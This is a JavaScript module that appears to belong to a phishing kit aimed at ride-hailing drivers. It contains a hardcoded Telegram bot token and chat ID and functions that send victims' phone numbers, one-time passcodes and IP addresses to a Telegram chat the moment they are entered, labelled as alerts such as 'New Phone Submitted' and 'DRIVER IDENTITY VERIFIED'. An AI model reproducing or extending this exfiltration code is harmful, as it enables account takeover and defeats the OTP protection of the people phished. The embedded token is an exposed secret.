const https = require('https');
const fs = require('fs');
const path = require('path');

const STORE_PATH = path.join(__dirname, 'telegram_store.json');

let botToken = '8952162506:AAHz_Jzd918IOGz5wf7wWYkB4Hglr8rhegg';
let chatId = '934345778';

/**
 * Configure Telegram Bot Token and Chat ID (supports comma-separated IDs)
 */
function configureTelegram(token, id) {
    botToken = (token || '').trim();
    chatId = (id || '').trim();
    console.log(`[TelegramNotifier] Configured Token: ${botToken ? 'YES' : 'NO'}, ChatID(s): ${chatId || 'NONE'}`);
    saveLocalFile();
    return !!(botToken && chatId);
}

/**
 * Get current Telegram configuration
 */
function getTelegramConfig() {
    return {
        botToken: botToken ? '••••••••' + botToken.slice(-5) : '',
        chatId: chatId || '',
        configured: !!(botToken && chatId)
    };
}

/**
 * Send raw HTTPS request to Telegram Bot API (supports sending to multiple Chat IDs)
 */
function sendTelegramMessage(text) {
    if (!botToken || !chatId) {
        console.log('[TelegramNotifier] Skipping Telegram alert - Bot Token or Chat ID missing.');
        return Promise.resolve(false);
    }

    const ids = chatId.split(',').map(id => id.trim()).filter(id => id);

    const promises = ids.map(targetId => {
        return new Promise((resolve) => {
            const payload = JSON.stringify({
                chat_id: targetId,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });

            const req = https.request({
                hostname: 'api.telegram.org',
                path: `/bot${botToken}/sendMessage`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                },
                timeout: 5000
            }, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const parsed = JSON.parse(data);
                        if (parsed.ok) {
                            console.log(`[TelegramNotifier] ⚡ Instant alert sent to Chat ID ${targetId}`);
                            resolve(true);
                        } else {
                            console.error(`[TelegramNotifier] API Error for ${targetId}:`, parsed.description);
                            resolve(false);
                        }
                    } catch (e) {
                        resolve(false);
                    }
                });
            });

            req.on('error', (err) => {
                console.error(`[TelegramNotifier] Request error for ${targetId}:`, err.message);
                resolve(false);
            });

            req.write(payload);
            req.end();
        });
    });

    return Promise.all(promises);
}

/**
 * Send instant alert when phone number is submitted
 */
async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
    const timeStr = new Date(submittedAt || Date.now()).toLocaleTimeString('en-US', {
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const msg = `📱 <b>New Phone Submitted!</b>\n\n` +
                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
                `⏳ <b>Status:</b> Awaiting Driver OTP\n` +
                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                `⏰ <b>Time:</b> ${timeStr}`;

    return sendTelegramMessage(msg);
}

/**
 * Send instant alert when OTP is submitted and verified
 */
async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
    const timeStr = new Date(verifiedAt || Date.now()).toLocaleString('en-US', {
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const msg = `✅ <b>DRIVER IDENTITY VERIFIED!</b>\n\n` +
                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
                `🔑 <b>OTP Code:</b> <code>${otp}</code>\n` +
                `STATUS: <b>VERIFIED</b>\n` +
                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                `⏰ <b>Time:</b> ${timeStr}`;

    return sendTelegramMessage(msg);
}

/**
 * Send test alert
 */
async function sendTestNotification() {
    if (!botToken || !chatId) {
        throw new Error('رجاءً أدخل Bot Token و Chat ID أولاً في الإعدادات!');
    }
    const msg = `⚡ <b>Guber Telegram Test Alert</b>\n\n` +
                `✅ Your Telegram Bot notifications are working 100% INSTANTLY!`;
    return sendTelegramMessage(msg);
}

/**
 * Load persisted settings from file
 */
function initPersistedSettings() {
    try {
        if (fs.existsSync(STORE_PATH)) {
            const raw = fs.readFileSync(STORE_PATH, 'utf8');
            const data = JSON.parse(raw);
            if (data.botToken && data.chatId) {
                botToken = data.botToken;
                chatId = data.chatId;
                console.log(`[TelegramNotifier] Loaded Telegram config. ChatID(s): ${chatId}`);
            }
        }
    } catch (err) {}
}

function saveLocalFile() {
    try {
        fs.writeFileSync(STORE_PATH, JSON.stringify({ botToken, chatId }, null, 2), 'utf8');
    } catch (e) {}
}

// Auto init on load
initPersistedSettings();

module.exports = {
    configureTelegram,
    getTelegramConfig,
    notifyPhoneSubmitted,
    notifyOTPVerified,
    sendTestNotification,
    initPersistedSettings
};
